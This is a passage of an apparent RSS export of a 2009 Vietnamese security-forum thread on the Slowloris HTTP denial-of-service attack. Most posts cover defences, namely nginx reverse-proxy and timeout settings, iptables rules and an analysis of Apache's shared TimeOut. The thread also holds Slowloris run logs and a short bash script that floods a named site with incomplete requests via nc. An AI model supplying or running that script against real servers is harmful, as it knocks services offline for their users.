+Current stats:  Slowloris has now sent 471 packets successfully.
+This thread now sleeping for 1 seconds...
+
+                Building sockets.
+                Building sockets.
+                Sending data.
+Current stats:  Slowloris has now sent 480 packets successfully.
+This thread now sleeping for 1 seconds...
+
+                Building sockets.
+                Sending data.
+Current stats:  Slowloris has now sent 487 packets successfully.
+This thread now sleeping for 1 seconds...</pre>
+		</div>
+Theo em, việc giải quyết bài toán các users sử dụng chung 1 IP proxy khá đau đầu, vì có thể cản lọc những user hợp lệ. Làm sao phải vừa chống các cuộc tấn công từ IP đó nhưng vẫn cho các user khác truy cập bình thường.]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/29851.hva#184631</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/29851.hva#184631</link>
+				<pubDate><![CDATA[Thu, 25 Jun 2009 12:23:43]]> GMT</pubDate>
+				<author><![CDATA[ LeVuHoang]]></author>
+			</item>
+			<item>
+				<title>Apache HTTP DoS</title>
+				<description><![CDATA[ Chắc lúc đó anh conmale sẽ cặm cụi ngồi bật netstat xem source port rồi chặn kiểu
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>iptables -I conmale -p tcp -i eth0 --sport $PORT -j DROP</pre>
+		</div>
+j/k. Hì hì, vì bản thân em chưa thấy giải pháp nào tránh được việc chặn nguyên cả một cụm IP xài chung một proxy cả :P. ]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/29851.hva#184665</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/29851.hva#184665</link>
+				<pubDate><![CDATA[Thu, 25 Jun 2009 19:09:10]]> GMT</pubDate>
+				<author><![CDATA[ mR.Bi]]></author>
+			</item>
+			<item>
+				<title>Apache HTTP DoS</title>
+				<description><![CDATA[ Sau khi test vài cái Web lên đường (trong đó có checkpoint  của lão Hoàng) , và đã thữ nghiệm thành công cách phòng chống hiệu quả . Xin được ra mắt bà con gần xa cách chống thằng này . 
+
+1. Cài nginx 
+<blockquote>sudo yum install nginx&nbsp;
+		</blockquote>
+
+2. Đại khái vào /etc/nginx/sites-available/default điểu chỉnh như sau để thành reverse proxy
+<blockquote>  proxy_set_header  X-Forwarded-For  $remote_addr;
+
+<font color='yellow'>
+worker_processes 2 
+client_header_timeout 5;
+ignore_invalid_headers on;
+limit_zone gulag $binary_remote_addr 1m;
+
+</font>
+  server {
+    listen 80;
+    server_name hvaonline.net;
+    location / { proxy_pass<span class="link"> http://hvaonline.net:8000;</span> }
+  }
+
+ &nbsp;
+		</blockquote>
+
+3. Vào apache sửa dòng listen qua port khác . 
+<blockquote>listen 8000&nbsp;
+		</blockquote>
+
+4. Tạo log cho apache để nhìn cho dễ
+<blockquote>LogFormat "%{X-Forwarded-For}i %l %u %t \"%r\" %&gt;s %b \"%{Referer}i\" \"%{User-Agent}i\"" proxy-combined&nbsp;
+		</blockquote>
+
+5. Cho thêm mấy cái này vào trong server chạy apache
+<blockquote>iptables -A INPUT -p tcp -s xxx.xxx.xxx.xxx --dport 8000 -j ACCEPT
+iptables -A INPUT -p tcp --dport 8000 -j DROP
+&nbsp;
+		</blockquote>
+
+-s  xxx.xxx.xxx.xxx  là IP của server chạy nginx . 
+
+ps : Đang bí chiêu , mong mỏi phân tích của anh male  . 
+
+]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/29851.hva#184717</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/29851.hva#184717</link>
+				<pubDate><![CDATA[Fri, 26 Jun 2009 13:03:17]]> GMT</pubDate>
+				<author><![CDATA[ tranvanminh]]></author>
+			</item>
+			<item>
+				<title>Apache HTTP DoS</title>
+				<description><![CDATA[ <blockquote>You can practice good web server security by doing the following:
+
+   1. Limit the amount of connections and how fast those connections can be made from any ip address to your web server by use of your firewall. This can be done with PF (we have a "how to") or Iptables.
+   2. Time out clients who take too long to perform any action.
+   3. Drop clients immediately who send invalid data.
+   4. Limit the amount or memory, cpu time and system resources the webserver can use. This is so the webserver can not take down the machine if the site is attacked.
+
+The following Nginx directives will timeout clients who take too long to communicate their intentions to the server. The ignore_invalid_headers directive will drop any client trying to send invalid headers to the server. The explanations of each one is listed above on this page.
+
+    * client_header_timeout 5;
+    * client_body_timeout 10;
+    * keepalive_timeout 5;
+    * ignore_invalid_headers on;
+    * send_timeout 10;&nbsp;
+		</blockquote>
+
+<span class="link"> https://calomel.org/nginx.html</span>]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/29851.hva#184723</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/29851.hva#184723</link>
+				<pubDate><![CDATA[Fri, 26 Jun 2009 14:23:22]]> GMT</pubDate>
+				<author><![CDATA[ tranvanminh]]></author>
+			</item>
+			<item>
+				<title>Apache HTTP DoS</title>
+				<description><![CDATA[ Hôm qua giờ lục cái mớ code của apache, nginx và lighthttpd để coi (tất nhiên là không có source của IIS  :P ) thì mới thấy apache "chết" với dạng DoS này là chuyện hiển nhiên.
+
+Apache mở socket và nhận data từ client (3-way handshakes đã hoàn tất) cho mọi request đi vào. Trong trường hợp slowloris tấn công ở đây, nó cố tình không gởi một cái CRLF để hoàn tất request header cho nên apache cứ việc chờ. Trạng thái chờ này sẽ kéo dài cho đến khi timeout (theo mặc định apache hiện chờ 300 giây - 5 phút). Quá 5 phút này, socket ấy sẽ bị hủy. Kẹt ở chỗ là trong vòng 5 phút ấy slowloris đã "nện" thêm khoảng 3000 cú (mở 3000 sockets nếu không có cái gì giới hạn ở phía apache hoặc phía trước apache). Cứ thế, cứ chồng chất lên.
+
+Với mặc định 150 MaxClients thì mất bao lâu apache sẽ không còn phục vụ được ai nữa? Chỉ 15 giây không hơn, không kém. Giá trị TimeOut của apache (theo mặc định là 300) nhằm ấn định cho cái gì? Nó ấn định cho 3 điều chính:
+
+1. Thời gian cần thiết để nhận trọn vẹn một cú GET hoặc 
+2. Thời gian giữa các gói tin TCP chuyên chở cú POST hoặc PUT (có chứa data).
+3. Thời gian giữa các cú TCP ACK trong quá trình chuyển tải dữ liệu giữa client (browser) và web server (apache).
+
+
+Với điểm số 1. ở trên, slowloris cố tình làm cho cú GET gởi đến apache không hoàn tất và buộc apache phải đợi. Bởi thế, nếu TimeOut ở trên rút ngắn xuống đến mức tối thiểu thì slowloris trở nên vô tác dụng. Tuy nhiên, nó cũng tạo vấn đề bởi vì nếu giá trị này quá ngắn thì một cú GET hợp lệ và vô tội cũng bị dính theo. Tệ hại hơn nữa, một cú POST (gởi bài lên một diễn đàn chẳng hạn) cũng sẽ bị chung số phận.
+
+Cơ chế xử lý một request của apache khá chặt chẽ, nó có đến 7 phase khác nhau (unescapes URL, strips parent and elements from the URI, initial URI location walk, translate_name, Hook: map_to_storage, URI location walk, Hook: header_parser). Tuy nhiên, đến phase "parse" header của một HTTP request thì nó bị "chết" bởi slowloris vì apache hoàn toàn không có cơ chế nào kiểm tra nội dung của header cho đến khi nó nhận được đầy đủ (dựa vào CRLF character trên HTTP header). Socket do slowloris khởi tạo vẫn giữ nguyên ở đó và apache vẫn chờ cho đến khi TimeOut.
+
+Nếu apache không dùng giá trị TimeOut chung như thế này mà gán TimeOut cụ thể cho từng loại GET, POST, HEAD.... thậm chí cụ thể hơn cho từng ấn định như LimitRequestLine, LimitRequestFieldSize.... thì TimeOut cho loại này có thể được kiểm soát chặt chẽ và hữu lý hơn. Ví dụ, nếu LimitRequestFieldSize là 2k và LimitRequestLine là 7 (chẳng hạn) thì tổng số dung lượng của cả cú GET đó không thể quá 20K (bao gồm cả URI). Cho dù một client dùng modem analog cỡ 14.4 bauds đi chăng nữa, cũng mất không quá vài giây để hoàn thành. Nếu lâu hơn giá trị TimeOut ấn định cụ thể cho loại GET này thì slowloris hoàn toàn bị khống chế. Ngay cả một cơ chế Timer dùng để đo thời gian tốn cho mỗi dòng HTTP header được đọc xuyên qua socket được ứng dụng cũng có thể vô hiệu hóa slowloris khá dễ dàng bởi lẽ chính apache đã có cơ chế đếm và giới hạn bao nhiêu dòng trên HTTP header.
+
+Điểm yếu của apache là nó chờ cho request header hoàn tất rồi mới sanitize nội dung header. Với giá trị TimeOut được dùng chung như thế thì sẽ tạo ảnh hưởng tổng thể cho cả các request hợp lệ khác. Có lẽ phải đợi cho đến khi apache có ứng dụng tách rời các giá trị TimeOut ra thành từng mảng nhỏ cho từng trường hợp thì mới có thể khắc chế hữu hiệu trên tầng ứng dụng (application). Ngoài ra, để khắc chế dạng tấn công như slowloris phải cậy vào những cơ chế khác ở tầng thấp hơn (điều chỉnh kernel paramters, hạn chế connection trên firewall, hạn chê tầng số nhận SYN.....) thì mới chịu thấu. Trên apache, gia tăng MaxClients tối đa, gia giảm TimeOut, gia giảm KeepAliveTimeOut... có thể trợ giúp một phần. Tuy nhiên nếu chỉ đơn thuần điều chỉnh những giá trị này trên Apache mà không có gì khác chống che thì sớm muộn Apache cũng bị "denial of service" (mặc dù nó không chết).
+
+Vậy tại sao nginx chống đỡ được slowloris (với mức độ tấn công ít dồn dập) mà apache không thể (cũng với cùng mức độ này)? Đơn giản là vì nginx có ấn định "TimeOut" chi tiết hơn và hợp lý hơn chớ không như một "TimeOut" chung của apache. Song song vào đó, nginx có cơ chế buffering data nhận từ HTTP headers của clients. Những headers nào thuộc dạng invalid (ví dụ như thiếu CRLF) thì cho đi ngay. Tuy vậy, bản thân nginx cũng không tránh khỏi nạn "denial of service" nếu như số worker_connections đã bị dùng hết. Những connection sau đó sẽ bị nginx từ chối (cũng y hệt như apache MaxClients).
+
+Thật ra nginx cũng phải dựa trên giới hạn connection (ngx_http_limit_zone) và từ chối tiếp nhận requests từ cùng một IP nếu IP này đụng đến giới hạn connection được ấn định sẵn. Nếu slowloris được dàn ra như một thế trận bots thì cả nginx cũng sẽ chết nhanh chóng. Việc nginx từ chối IP và giới hạn connection nếu mức độ tấn công đi đến một giới hạn nào đó nếu so ra thì cũng giống y hệt như ứng dụng phòng thủ trên HVA ngay lúc này. Điều này có nghĩa chính nginx, nếu dùng như một reverse proxy hoặc một web front end, khi bị DDoS nó cũng sẽ từ chối một IP của một proxy chính như của VNPT vậy.
+
+PS: lighthttpd chịu không thấu slowloris. Những ai có ý định dùng mod_security trên apache để chống đỡ thì nên từ bỏ ý định bởi vì ngay cả ở phase 1 của mod_security (phase xảy ra sớm nhất mà mod_security có thể can thiệp) thì cũng thuộc giai đoạn xảy sau khi HTTP headers được apache nhận đủ. slowloris tấn công dừng lại ở bước chính apache phải chờ trước khi chuyển thông tin vào để xử lý (bước này mới đụng đến không gian của mod_security).]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/29851.hva#184737</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/29851.hva#184737</link>
+				<pubDate><![CDATA[Fri, 26 Jun 2009 17:56:51]]> GMT</pubDate>
+				<author><![CDATA[ conmale]]></author>
+			</item>
+			<item>
+				<title>Apache HTTP DoS</title>
+				<description><![CDATA[ <p></p>
+		<cite class="blockquote">conmale wrote:</cite><br>
+		<blockquote>
+PS: lighthttpd chịu không thấu slowloris.
+&nbsp;
+		</blockquote>
+
+Ý anh ở đây là sao ạ (chịu không thấu ở đây là sức chịu đựng khi so sánh với apache và nginx có phải không anh), anh có thể phân tích rõ hơn nguyên nhân tại sao không anh :D]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/29851.hva#184751</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/29851.hva#184751</link>
+				<pubDate><![CDATA[Fri, 26 Jun 2009 22:17:54]]> GMT</pubDate>
+				<author><![CDATA[ K4i]]></author>
+			</item>
+			<item>
+				<title>Apache HTTP DoS</title>
+				<description><![CDATA[ Đã làm theo cách của bác tranvanminh,cải thiện tốc độ chút ít!]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/29851.hva#184785</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/29851.hva#184785</link>
+				<pubDate><![CDATA[Sat, 27 Jun 2009 13:44:09]]> GMT</pubDate>
+				<author><![CDATA[ 8668]]></author>
+			</item>
+			<item>
+				<title>Apache HTTP DoS</title>
+				<description><![CDATA[ <p></p>
+		<cite class="blockquote">K4i wrote:</cite><br>
+		<blockquote><p></p>
+		<cite class="blockquote">conmale wrote:</cite><br>
+		<blockquote>
+PS: lighthttpd chịu không thấu slowloris.
+&nbsp;
+		</blockquote>
+
+Ý anh ở đây là sao ạ (chịu không thấu ở đây là sức chịu đựng khi so sánh với apache và nginx có phải không anh), anh có thể phân tích rõ hơn nguyên nhân tại sao không anh :D&nbsp;
+		</blockquote>
+
+Đơn giản là lighthttpd cũng không có những ấn định cụ thể và chi tiết cho việc kiểm soát "TimeOut" nên khi bị slowloris "oánh" thì nó cũng chết đứ đừ. Tính ra nó bền hơn apache một tí (trong điều kiện cả lighthttpd và apache đều không có gì khác bảo vệ).]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/29851.hva#184799</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/29851.hva#184799</link>
+				<pubDate><![CDATA[Sat, 27 Jun 2009 16:52:51]]> GMT</pubDate>
+				<author><![CDATA[ conmale]]></author>
+			</item>
+			<item>
+				<title>Apache HTTP DoS</title>
+				<description><![CDATA[ Mình hết sức thắc mắc 2 điểm là :
+
+1. Sao đến giờ này, chưa thấy có report / chưa "cảm thấy" được một.. "làn sóng" căng thẳng nào về việc khai thác lỗ hổng này vì với tính chất nghiêm trọng và khả năng dễ khai thác như vậy thì đây quả là một điều hết sức..không bình thường. Phải chẳng là trước khi bão thì biển rất lặng?!
+
+
+2. Đã khá lâu rồi mà bạn Apache chưa thể hiện bất kể một ý định gì ;-) ?]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/29851.hva#184827</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/29851.hva#184827</link>
+				<pubDate><![CDATA[Sun, 28 Jun 2009 00:35:09]]> GMT</pubDate>
+				<author><![CDATA[ Abe]]></author>
+			</item>
+			<item>
+				<title>Apache HTTP DoS</title>
+				<description><![CDATA[ <p></p>
+		<cite class="blockquote">Abe wrote:</cite><br>
+		<blockquote>Mình hết sức thắc mắc 2 điểm là :
+
+1. Sao đến giờ này, chưa thấy có report / chưa "cảm thấy" được một.. "làn sóng" căng thẳng nào về việc khai thác lỗ hổng này vì với tính chất nghiêm trọng và khả năng dễ khai thác như vậy thì đây quả là một điều hết sức..không bình thường. Phải chẳng là trước khi bão thì biển rất lặng?!
+&nbsp;
+		</blockquote>
+Chưa đâu. Còn mới mẻ quá mà. Thật ra cái perl script (slowloris) đã được công bố và đã có vài phiên bản khác nhau (viết bằng python và php) đã được ra đời. Tuy nhiên để tích hợp nó vào botnets thì không đơn giản mà nếu chơi "solo" thì không mấy hiệu quả vì IP có thể bị ban ngay. Riêng cái slowloris nguyên thủy nếu để chạy được thì khối ông kiddies cũng phải vò đầu, rứt tai bởi vì cần phải có một mớ perl modules (cộng thêm một mớ dependencies nữa).
+
+Hiện nay <b>sans</b> đã chính thức công bố có vài vụ DDoS sử dụng slowloris để tấn công Iran (từ sau vụ bầu cử ở Iran). Ngoài ra chưa thấy thêm thông tin gì về các cuộc tấn công khác dùng slowloris. Riêng trên HVA thì từ ngày 19 tháng 6 2009 đến nay cũng có kha khá các vụ "thử nghiệm" nhưng chỉ xảy ra rời rạc và ngắn ngủi. Tuy vậy, tương lai vài tháng tới thì chưa biết sao. 
+
+<p></p>
+		<cite class="blockquote">Abe wrote:</cite><br>
+		<blockquote>
+2. Đã khá lâu rồi mà bạn Apache chưa thể hiện bất kể một ý định gì ;-) ?&nbsp;
+		</blockquote>
+Theo một số thảo luận của đám developers thì apache chưa có quyết định chính thức nhưng hiện đã có nhiều đề xuất khác nhau để fix tình trạng này. Hiện tượng trông có vẻ đơn giản nhưng lại khá phức tạp vì nó đụng đến nền tảng architecture của httpd apache. Đã có một patch (unofficial) cho apache 2.2.11 (và chỉ cho prefork mpm mà thôi) nhưng tôi thấy biện pháp xử lý mà patch này muốn thực hiện có vẻ không được triệt để.
+
+Nếu tôi đoán không sai thì apache sẽ áp dụng biện pháp "granular timeout". Hãy đón xem chuyện gì sẽ xảy ra trong vòng vài tuần tới.]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/29851.hva#184852</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/29851.hva#184852</link>
+				<pubDate><![CDATA[Sun, 28 Jun 2009 13:31:26]]> GMT</pubDate>
+				<author><![CDATA[ conmale]]></author>
+			</item>
+			<item>
+				<title>Apache HTTP DoS</title>
+				<description><![CDATA[ <p></p>
+		<cite class="blockquote">conmale wrote:</cite><br>
+		<blockquote><p></p>
+		<cite class="blockquote">Abe wrote:</cite><br>
+		<blockquote>Mình hết sức thắc mắc 2 điểm là :
+
+1. Sao đến giờ này, chưa thấy có report / chưa "cảm thấy" được một.. "làn sóng" căng thẳng nào về việc khai thác lỗ hổng này vì với tính chất nghiêm trọng và khả năng dễ khai thác như vậy thì đây quả là một điều hết sức..không bình thường. Phải chẳng là trước khi bão thì biển rất lặng?!
+&nbsp;
+		</blockquote>
+Chưa đâu. Còn mới mẻ quá mà. Thật ra cái perl script (slowloris) đã được công bố và đã có vài phiên bản khác nhau (viết bằng python và php) đã được ra đời. Tuy nhiên để tích hợp nó vào botnets thì không đơn giản mà nếu chơi "solo" thì không mấy hiệu quả vì IP có thể bị ban ngay. Riêng cái slowloris nguyên thủy nếu để chạy được thì khối ông kiddies cũng phải vò đầu, rứt tai bởi vì cần phải có một mớ perl modules (cộng thêm một mớ dependencies nữa).
+
+Hiện nay <b>sans</b> đã chính thức công bố có vài vụ DDoS sử dụng slowloris để tấn công Iran (từ sau vụ bầu cử ở Iran). Ngoài ra chưa thấy thêm thông tin gì về các cuộc tấn công khác dùng slowloris. Riêng trên HVA thì từ ngày 19 tháng 6 2009 đến nay cũng có kha khá các vụ "thử nghiệm" nhưng chỉ xảy ra rời rạc và ngắn ngủi. Tuy vậy, tương lai vài tháng tới thì chưa biết sao. 
+&nbsp;
+		</blockquote>
+
+Theo em đánh giá thì vẫn đề này hết sức nghiệm trọng chứ không phải bình thường nên thời gian là 2 tuần cho tới bây giờ là tương đối dài. Thật ra thì em đánh giá các bạn có được trong tay 1 hay nhiều botnets không hề thấp nên việc các bạn ý làm ra 1 quả binary rồi cho pwned users exec là việc không hề khó ;-) 
+
+Còn hiện tại thì vẫn có rất nhiều bạn "đơn nam" solo chết một cơ số các site/server, đặc biệt là mấy bạn hosting. Việc ngồi canh để Ban IP thật ra thì cũng không phải là một cách hay và dễ chịu đâu anh ạ :-*
+
+Bên cạnh đó, trong một số trường hợp (mà em đã được chứng thực) thì khá nhiều tay sysadmin hết sức lúng tung khi gặp phải vấn đề này, từ "wtf" cho tới "when", "why", "how" ;-)
+
+Vấn đề mấy ông vò đầu bứt tai thì quả thực là p4int in @ss nhưng mà cũng có cực nhiều đồng chí chả cần biết nó cần những modules / dependencies gì mà vẫn thấy <b>perl -dns victim.vn</b> ầm ầm mà không gặp trở ngại nào :-O , vấn đề ở chỗ cái liveCD/cái nhiều cái OS image nó có full hết rồi :*- 
+<p></p>
+		<cite class="blockquote">conmale wrote:</cite><br>
+		<blockquote><p></p>
+		<cite class="blockquote">Abe wrote:</cite><br>
+		<blockquote>
+2. Đã khá lâu rồi mà bạn Apache chưa thể hiện bất kể một ý định gì ;-) ?&nbsp;
+		</blockquote>
+Theo một số thảo luận của đám developers thì apache chưa có quyết định chính thức nhưng hiện đã có nhiều đề xuất khác nhau để fix tình trạng này. Hiện tượng trông có vẻ đơn giản nhưng lại khá phức tạp vì nó đụng đến nền tảng architecture của httpd apache. Đã có một patch (unofficial) cho apache 2.2.11 (và chỉ cho prefork mpm mà thôi) nhưng tôi thấy biện pháp xử lý mà patch này muốn thực hiện có vẻ không được triệt để.
+
+Nếu tôi đoán không sai thì apache sẽ áp dụng biện pháp "granular timeout". Hãy đón xem chuyện gì sẽ xảy ra trong vòng vài tuần tới.&nbsp;
+		</blockquote>  
+
+Absolutely agree. Em cũng đã nghĩ như anh, vấn đề em thắc mắc là bạn Apache foundation không/chưa có một động thái gì, ít nhất là để trấn an cộng đồng blah blah.. vì em nghĩ các bạn ý sẽ không ra patch mà sẽ sớm release new version sau hơn nửa năm..ngủ quên lol .. còn cả bạn Squid nữa chứ..
+
+
+May mà đây toàn là các bạn Opensource.. chứ không thì mấy bạn như nginx phê đừng hỏi  -:-) ]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/29851.hva#184877</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/29851.hva#184877</link>
+				<pubDate><![CDATA[Sun, 28 Jun 2009 19:30:55]]> GMT</pubDate>
+				<author><![CDATA[ Abe]]></author>
+			</item>
+			<item>
+				<title>Apache HTTP DoS</title>
+				<description><![CDATA[ Phiên bản rút gọn nhất dành cho script kiddies:
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>#!/bin/bash
+while true; do
+printf “GET / HTTP/1.0\n”|nc $1 80 &
+done</pre>
+		</div>
+Cách sử dụng
+<font color='yellow'>./bashloris.sh www.hvaonline.net</font>
+nguồn:<span class="link"> http://www.darknet.org.uk/2009/06/slowloris-http-dos-tool-in-perl/</span>
+:D
+]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/29851.hva#184930</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/29851.hva#184930</link>
+				<pubDate><![CDATA[Mon, 29 Jun 2009 03:58:50]]> GMT</pubDate>
+				<author><![CDATA[ gamma95]]></author>
+			</item>
+			<item>
+				<title>Apache HTTP DoS</title>
+				<description><![CDATA[ <p></p>
+		<cite class="blockquote">Abe wrote:</cite><br>
+		<blockquote>
+Theo em đánh giá thì vẫn đề này hết sức nghiệm trọng chứ không phải bình thường nên thời gian là 2 tuần cho tới bây giờ là tương đối dài. Thật ra thì em đánh giá các bạn có được trong tay 1 hay nhiều botnets không hề thấp nên việc các bạn ý làm ra 1 quả binary rồi cho pwned users exec là việc không hề khó ;-) 
+
+Còn hiện tại thì vẫn có rất nhiều bạn "đơn nam" solo chết một cơ số các site/server, đặc biệt là mấy bạn hosting. <font color='red'>Việc ngồi canh để Ban IP thật ra thì cũng không phải là một cách hay và dễ chịu đâu anh ạ</font> :-*
+
+Bên cạnh đó, trong một số trường hợp (mà em đã được chứng thực) thì <font color='orange'>khá nhiều tay sysadmin hết sức lúng tung</font> khi gặp phải vấn đề này, từ "wtf" cho tới "when", "why", "how" ;-)
+
+Vấn đề mấy ông vò đầu bứt tai thì quả thực là p4int in @ss nhưng mà cũng có cực nhiều đồng chí chả cần biết nó cần những modules / dependencies gì mà vẫn thấy <b>perl -dns victim.vn</b> ầm ầm mà không gặp trở ngại nào :-O , vấn đề ở chỗ cái liveCD/cái nhiều cái OS image nó có full hết rồi :*- 
+&nbsp;
+		</blockquote>
+
+<font color='red'>-----&gt;</font> sao nghe thủ công quá vậy? :P 
+
+<font color='orange'>-----&gt;</font> đây là do sysadmin được train cho... mì ăn liền thì phải vậy thôi.
+
+<p></p>
+		<cite class="blockquote">Abe wrote:</cite><br>
+		<blockquote>
+Absolutely agree. Em cũng đã nghĩ như anh, vấn đề em thắc mắc là bạn Apache foundation không/chưa có một động thái gì, ít nhất là để trấn an cộng đồng blah blah.. vì em nghĩ các bạn ý sẽ không ra patch mà sẽ sớm release new version sau hơn nửa năm..ngủ quên lol .. còn cả bạn Squid nữa chứ..
+
+
+May mà đây toàn là các bạn Opensource.. chứ không thì mấy bạn như nginx phê đừng hỏi  -:-) &nbsp;
+		</blockquote> 
+Anh nghĩ họ không cần lên tiếng vì nếu họ chính thức lên tiếng thì càng làm cho thiên hạ rối lên mà thôi.]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/29851.hva#184936</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/29851.hva#184936</link>
+				<pubDate><![CDATA[Mon, 29 Jun 2009 06:53:38]]> GMT</pubDate>
+				<author><![CDATA[ conmale]]></author>
+			</item>
+			<item>
+				<title>Apache HTTP DoS</title>
+				<description><![CDATA[ <p></p>
+		<cite class="blockquote">8668 wrote:</cite><br>
+		<blockquote>Đã làm theo cách của bác tranvanminh,cải thiện tốc độ chút ít!&nbsp;
+		</blockquote>
+
+Thật ra khi tui post bài đó lên , tui và lão Hoàng cũng đã thử điều chỉnh sao cho thằng nginx hiệu quả , ruốt cuộc đúc kết được mấy cái option này . 
+<blockquote>
+worker_processes 2
+client_header_timeout 5;
+ignore_invalid_headers on;
+limit_zone gulag $binary_remote_addr 1m;
+&nbsp;
+		</blockquote>
+
+Nó hoạt động như thế nào thì bạn vào đọc tài liệu tại<span class="link"> https://calomel.org/nginx.html</span> . 
+
+Hôm qua, có bạn hỏi thăm tui, bây giờ server đang hoạt động nên không thể ráp thêm 1 con proxy vào và cũng không có tiền để mua server cho việc phòng hờ . Nhưng mà theo như kết quả test , thì mình chỉ cần cài đặt nginx vào server chung với apache vẫn có hiệu quả chống slowloris  được như thường . Cách làm như tui đã post , chỉ cần cài đặt như bài trên thì cũng ngon lành rồi . 
+
+Còn có thật hay không thì các bạn tự làm thử đi rồi biết  -:-) ]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/29851.hva#184946</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/29851.hva#184946</link>
+				<pubDate><![CDATA[Mon, 29 Jun 2009 10:58:02]]> GMT</pubDate>
+				<author><![CDATA[ tranvanminh]]></author>
+			</item>
+			<item>
+				<title>Apache HTTP DoS</title>
+				<description><![CDATA[ <p></p>
+		<cite class="blockquote">tranvanminh wrote:</cite><br>
+		<blockquote><p></p>
+		<cite class="blockquote">8668 wrote:</cite><br>
+		<blockquote>Đã làm theo cách của bác tranvanminh,cải thiện tốc độ chút ít!&nbsp;
+		</blockquote>
+
+Thật ra khi tui post bài đó lên , tui và lão Hoàng cũng đã thử điều chỉnh sao cho thằng nginx hiệu quả , ruốt cuộc đúc kết được mấy cái option này . 
+<blockquote>
+worker_processes 2
+client_header_timeout 5;
+ignore_invalid_headers on;
+limit_zone gulag $binary_remote_addr 1m;
+&nbsp;
+		</blockquote>
+
+Nó hoạt động như thế nào thì bạn vào đọc tài liệu tại<span class="link"> https://calomel.org/nginx.html</span> . 
+
+Hôm qua, có bạn hỏi thăm tui, bây giờ server đang hoạt động nên không thể ráp thêm 1 con proxy vào và cũng không có tiền để mua server cho việc phòng hờ . Nhưng mà theo như kết quả test , thì mình chỉ cần cài đặt nginx vào server chung với apache vẫn có hiệu quả chống slowloris  được như thường . Cách làm như tui đã post , chỉ cần cài đặt như bài trên thì cũng ngon lành rồi . 
+
+Còn có thật hay không thì các bạn tự làm thử đi rồi biết  -:-) &nbsp;
+		</blockquote>
+
+Cách đơn giản nhất để cài nginx làm proxy:<span class="link"> http://www.howtoforge.com/reduce-apache-load-with-nginx-rhel5.2</span>
+
+Tốt nhất là compile lại nginx vì gói rpm cũ qua rồi!
+
+Cảm ơn bác tranvanminh đã đưa ra giải pháp khá thú vị!]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/29851.hva#184979</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/29851.hva#184979</link>
+				<pubDate><![CDATA[Mon, 29 Jun 2009 16:31:19]]> GMT</pubDate>
+				<author><![CDATA[ 8668]]></author>
+			</item>
+			<item>
+				<title>Apache HTTP DoS</title>
+				<description><![CDATA[ Các bác dùng thử thằng này http://haproxy.1wt.eu/, option timeout http-request, cái này chắc đúng ý bác male :P. Em apply thằng này cho hệ thống đến nay vẫn ổn]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/29851.hva#185127</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/29851.hva#185127</link>
+				<pubDate><![CDATA[Wed, 1 Jul 2009 18:37:22]]> GMT</pubDate>
+				<author><![CDATA[ sup3rmm]]></author>
+			</item>
+			<item>
+				<title>Apache HTTP DoS</title>
+				<description><![CDATA[ Giải pháp tạm thời trên máy đơn khi chưa có bản vá cho apache bạn thử install cái mod_antiloris thử xem.
+
+Tham khảo link tôi gởi kèm:
+
+ftp://ftp.monshouwer.eu/pub/linux/mod_antiloris/
+
+
+
+
+]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/29851.hva#186470</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/29851.hva#186470</link>
+				<pubDate><![CDATA[Thu, 16 Jul 2009 11:01:18]]> GMT</pubDate>
+				<author><![CDATA[ matrix]]></author>
+			</item>
+			<item>
+				<title>Apache HTTP DoS</title>
+				<description><![CDATA[ Loay hoay mãi vẩn chưa run được, đuối.....Có bác nào giúp e trải nghiệm với, vì  em không rành về Perl. Thanks!]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/29851.hva#210489</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/29851.hva#210489</link>
+				<pubDate><![CDATA[Fri, 7 May 2010 04:36:14]]> GMT</pubDate>
+				<author><![CDATA[ xxxxx.kenji.xxxxx]]></author>
+			</item>
+			<item>
+				<title>Apache HTTP DoS</title>
+				<description><![CDATA[ <p></p>
+		<cite class="blockquote">xxxxx.kenji.xxxxx wrote:</cite><br>
